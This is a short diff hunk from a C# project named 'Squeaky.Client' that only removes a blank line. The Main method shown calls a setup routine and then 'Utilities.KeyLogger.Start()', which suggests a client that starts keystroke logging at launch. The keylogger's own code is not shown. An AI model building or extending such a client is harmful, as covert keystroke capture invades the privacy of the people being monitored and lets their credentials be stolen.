@@ -7,7 +7,6 @@ namespace Squeaky.Client
         static void Main(string[] args)
         {
             Setup.Start();
-
             Utilities.KeyLogger.Start();
         }
     }
